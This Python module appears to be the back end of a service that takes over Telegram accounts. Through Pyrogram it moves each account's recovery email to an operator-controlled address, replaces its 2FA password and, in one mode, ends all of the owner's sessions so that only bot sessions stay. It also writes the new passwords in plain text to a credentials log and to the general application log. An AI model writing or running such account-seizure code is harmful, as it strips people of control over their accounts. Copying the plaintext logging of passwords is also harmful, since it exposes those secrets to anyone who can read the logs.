"""
Transfer Service
Handles account transfer in two modes:

MODE 1 (user_keeps_session):
    - User keeps one active session
    - User changes email to our email
    - We change the 2FA password
    - User can still use the account but we control recovery

MODE 2 (bot_only):
    - User changes email to our email
    - User terminates all their sessions
    - Only bot sessions remain
    - Complete control transfer
"""

import asyncio
import secrets
import string
from datetime import datetime
from typing import Dict, Any, Optional
from enum import Enum

from backend.core_engine.logger import get_logger
from backend.core_engine.credentials_logger import log_credentials, generate_email_for_account
from backend.services.security_audit import SecurityAuditService, TransferMode

logger = get_logger("TransferService")


# Email domain configuration
from config import EMAIL_DOMAIN
OUR_EMAIL_DOMAIN = EMAIL_DOMAIN


class TransferStep(Enum):
    """Transfer process steps"""
    INITIATED = "initiated"
    AUDIT_COMPLETE = "audit_complete"
    EMAIL_CHANGE_PENDING = "email_change_pending"
    EMAIL_CODE_SENT = "email_code_sent"
    EMAIL_CONFIRMED = "email_confirmed"
    PASSWORD_CHANGED = "password_changed"
    SESSIONS_TERMINATED = "sessions_terminated"
    COMPLETED = "completed"
    FAILED = "failed"


class TransferService:
    """Manages the account transfer process"""
    
    def __init__(self):
        # Active transfers: {phone: transfer_state}
        self.active_transfers: Dict[str, Dict[str, Any]] = {}
    
    def generate_strong_password(self, length: int = 24) -> str:
        """Generate a strong random password"""
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
        return ''.join(secrets.choice(alphabet) for _ in range(length))
    
    def generate_our_email(self, telegram_id: int) -> str:
        """Generate email address for this account using encrypted hash"""
        from backend.core_engine.credentials_logger import get_full_email_info
        email_info = get_full_email_info(telegram_id)
        return email_info["email"]
    
    def get_email_hash(self, telegram_id: int) -> str:
        """Get the hash portion of the email for webhook matching"""
        from backend.core_engine.credentials_logger import get_email_hash as get_hash
        return get_hash(telegram_id)
    
    async def initiate_transfer(
        self,
        phone: str,
        telegram_id: int,
        mode: TransferMode,
        current_2fa_password: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Initiate account transfer process
        
        Args:
            phone: Phone number
            telegram_id: Telegram user ID
            mode: Transfer mode (user_keeps_session or bot_only)
            current_2fa_password: Current 2FA password if known
        
        Returns:
            Transfer state with next steps
        """
        logger.info(f"Initiating transfer for {phone} in mode: {mode.value}")
        
        our_email = self.generate_our_email(telegram_id)
        email_hash = self.get_email_hash(telegram_id)
        new_password = self.generate_strong_password()
        
        transfer_state = {
            "phone": phone,
            "telegram_id": telegram_id,
            "mode": mode.value,
            "step": TransferStep.INITIATED.value,
            "our_email": our_email,
            "email_hash": email_hash,
            "new_password": new_password,
            "current_password": current_2fa_password,
            "started_at": datetime.now().isoformat(),
            "email_code_received": None,
            "completed_at": None,
            "error": None
        }
        
        self.active_transfers[phone] = transfer_state
        
        # Log credentials
        log_credentials(
            phone=phone,
            action="TRANSFER_INITIATED",
            password=new_password,
            email=our_email,
            telegram_id=telegram_id,
            extra_data={
                "mode": mode.value,
                "email_hash": email_hash
            }
        )
        
        logger.info(f"Transfer initiated for {phone}")
        logger.info(f"  Email: {our_email}")
        logger.info(f"  Hash: {email_hash}")
        logger.info(f"  Mode: {mode.value}")
        
        return transfer_state
    
    async def execute_email_change(
        self,
        pyrogram_manager,
        phone: str,
        current_password: str
    ) -> Dict[str, Any]:
        """
        Execute the email change step
        
        Args:
            pyrogram_manager: PyrogramSessionManager instance
            phone: Phone number
            current_password: Current 2FA password
        
        Returns:
            Result of email change initiation
        """
        transfer = self.active_transfers.get(phone)
        if not transfer:
            return {"status": "error", "error": "No active transfer for this phone"}
        
        our_email = transfer["our_email"]
        
        logger.info(f"Executing email change for {phone} to {our_email}")
        
        # Update current password in state
        transfer["current_password"] = current_password
        
        # Call Pyrogram to change email
        result = await pyrogram_manager.change_recovery_email(
            phone=phone,
            current_password=current_password,
            new_email=our_email
        )
        
        if result.get("status") == "success":
            transfer["step"] = TransferStep.EMAIL_CODE_SENT.value
            logger.info(f"Email change initiated for {phone}, waiting for code")
            
            # Log to credentials
            log_credentials(
                phone=phone,
                action="EMAIL_CHANGE_INITIATED",
                email=our_email,
                telegram_id=transfer.get("telegram_id"),
                extra_data={"waiting_for_code": True}
            )
            
            return {
                "status": "success",
                "message": "Email change initiated. Verification code will be sent to the new email.",
                "our_email": our_email,
                "email_hash": transfer["email_hash"],
                "next_step": "Wait for email code via webhook or enter manually"
            }
        else:
            transfer["error"] = result.get("error")
            logger.error(f"Email change failed for {phone}: {result.get('error')}")
            return result
    
    async def confirm_email_with_code(
        self,
        pyrogram_manager,
        phone: str,
        code: str
    ) -> Dict[str, Any]:
        """
        Confirm email change with verification code
        
        Args:
            pyrogram_manager: PyrogramSessionManager instance
            phone: Phone number
            code: Verification code from email
        
        Returns:
            Result of email confirmation
        """
        transfer = self.active_transfers.get(phone)
        if not transfer:
            return {"status": "error", "error": "No active transfer for this phone"}
        
        logger.info(f"Confirming email for {phone} with code")
        
        result = await pyrogram_manager.confirm_recovery_email(phone, code)
        
        if result.get("status") == "success":
            transfer["step"] = TransferStep.EMAIL_CONFIRMED.value
            transfer["email_code_received"] = code
            
            logger.info(f"Email confirmed for {phone}")
            
            # Log to credentials
            log_credentials(
                phone=phone,
                action="EMAIL_CONFIRMED",
                email=transfer["our_email"],
                telegram_id=transfer.get("telegram_id")
            )
            
            return {
                "status": "success",
                "message": "Email confirmed successfully",
                "next_step": "change_password" if transfer.get("current_password") else "provide_current_password"
            }
        else:
            logger.error(f"Email confirmation failed for {phone}: {result.get('error')}")
            return result
    
    async def execute_password_change(
        self,
        pyrogram_manager,
        phone: str
    ) -> Dict[str, Any]:
        """
        Execute password change step
        
        Args:
            pyrogram_manager: PyrogramSessionManager instance
            phone: Phone number
        
        Returns:
            Result of password change
        """
        transfer = self.active_transfers.get(phone)
        if not transfer:
            return {"status": "error", "error": "No active transfer for this phone"}
        
        current_password = transfer.get("current_password")
        new_password = transfer.get("new_password")
        
        if not current_password:
            return {"status": "error", "error": "Current password not provided"}
        
        logger.info(f"Changing password for {phone}")
        
        result = await pyrogram_manager.change_2fa_password(
            phone=phone,
            current_password=current_password,
            new_password=new_password
        )
        
        if result.get("status") == "success":
            transfer["step"] = TransferStep.PASSWORD_CHANGED.value
            
            logger.info(f"Password changed for {phone}")
            
            # Log to credentials
            log_credentials(
                phone=phone,
                action="PASSWORD_CHANGED",
                password=new_password,
                telegram_id=transfer.get("telegram_id"),
                extra_data={"old_password_hash": "***"}
            )
            
            return {
                "status": "success",
                "message": "Password changed successfully",
                "new_password": new_password,
                "next_step": "terminate_sessions" if transfer["mode"] == "bot_only" else "completed"
            }
        else:
            logger.error(f"Password change failed for {phone}: {result.get('error')}")
            return result
    
    async def execute_session_termination(
        self,
        pyrogram_manager,
        phone: str
    ) -> Dict[str, Any]:
        """
        Terminate other sessions (for bot_only mode)
        
        Args:
            pyrogram_manager: PyrogramSessionManager instance
            phone: Phone number
        
        Returns:
            Result of session termination
        """
        transfer = self.active_transfers.get(phone)
        if not transfer:
            return {"status": "error", "error": "No active transfer for this phone"}
        
        if transfer["mode"] != "bot_only":
            logger.info(f"Skipping session termination for {phone} (mode: {transfer['mode']})")
            return {
                "status": "skipped",
                "message": "Session termination not required in user_keeps_session mode"
            }
        
        logger.info(f"Terminating other sessions for {phone}")
        
        result = await pyrogram_manager.terminate_other_sessions(phone)
        
        if result.get("status") == "success":
            transfer["step"] = TransferStep.SESSIONS_TERMINATED.value
            
            logger.info(f"Sessions terminated for {phone}: {result.get('terminated', 0)} sessions")
            
            # Log to credentials
            log_credentials(
                phone=phone,
                action="SESSIONS_TERMINATED",
                telegram_id=transfer.get("telegram_id"),
                extra_data={"terminated_count": result.get("terminated", 0)}
            )
            
            return {
                "status": "success",
                "message": f"Terminated {result.get('terminated', 0)} session(s)",
                "next_step": "completed"
            }
        else:
            logger.error(f"Session termination failed for {phone}: {result.get('error')}")
            return result
    
    async def complete_transfer(self, phone: str) -> Dict[str, Any]:
        """
        Mark transfer as completed
        
        Args:
            phone: Phone number
        
        Returns:
            Final transfer state
        """
        transfer = self.active_transfers.get(phone)
        if not transfer:
            return {"status": "error", "error": "No active transfer for this phone"}
        
        transfer["step"] = TransferStep.COMPLETED.value
        transfer["completed_at"] = datetime.now().isoformat()
        
        logger.info(f"Transfer completed for {phone}")
        logger.info(f"  Email: {transfer['our_email']}")
        logger.info(f"  Password: {transfer['new_password']}")
        logger.info(f"  Mode: {transfer['mode']}")
        
        # Log final credentials
        log_credentials(
            phone=phone,
            action="TRANSFER_COMPLETED",
            password=transfer["new_password"],
            email=transfer["our_email"],
            telegram_id=transfer.get("telegram_id"),
            extra_data={
                "mode": transfer["mode"],
                "started_at": transfer["started_at"],
                "completed_at": transfer["completed_at"]
            }
        )
        
        return {
            "status": "success",
            "message": "Transfer completed successfully",
            "transfer": transfer
        }
    
    def get_transfer_state(self, phone: str) -> Optional[Dict[str, Any]]:
        """Get current transfer state for a phone"""
        return self.active_transfers.get(phone)
    
    def get_all_transfers(self) -> Dict[str, Dict[str, Any]]:
        """Get all active transfers"""
        return self.active_transfers


# Singleton instance
_transfer_service: Optional[TransferService] = None


def get_transfer_service() -> TransferService:
    """Get TransferService singleton"""
    global _transfer_service
    if _transfer_service is None:
        _transfer_service = TransferService()
    return _transfer_service
